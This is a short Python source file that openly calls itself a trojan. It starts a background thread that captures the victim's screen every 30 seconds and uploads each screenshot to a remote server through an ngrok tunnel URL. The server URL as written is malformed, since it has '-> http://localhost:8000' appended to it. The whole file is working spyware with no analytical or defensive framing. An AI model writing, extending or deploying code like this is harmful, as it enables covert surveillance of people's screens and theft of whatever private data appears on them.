import pyautogui
import requests
import threading
import time
import os
from io import BytesIO

# Configuration
SERVER_URL = "https://dwain-slippery-idolatrously.ngrok-free.dev -> http://localhost:8000"
SCREENSHOT_INTERVAL = 30  # Time in seconds between each screenshot.

def take_screenshot_and_send():
    """The main loop for the trojan, runs in a background thread."""
    print("[Trojan] Background thread started. Monitoring...")
    while True:
        try:
            screenshot = pyautogui.screenshot()
            img_buffer = BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_buffer.seek(0)

            files = {'screenshot': ('screenshot.png', img_buffer, 'image/png')}
            print(f"[Trojan] Sending screenshot to {SERVER_URL}...")
            response = requests.post(SERVER_URL, files=files, timeout=15)
            print(f"[Trojan] Server response: {response.status_code}")

        except Exception as e:
            print(f"[Trojan] An error occurred: {e}")

        print(f"[Trojan] Sleeping for {SCREENSHOT_INTERVAL} seconds...")
        time.sleep(SCREENSHOT_INTERVAL)

def start_trojan():
    """It starts the trojan in a background thread."""
    screenshot_thread = threading.Thread(target=take_screenshot_and_send, daemon=False)
    screenshot_thread.start()
    print("[Trojan] Trojan initiated. It will run in the background.")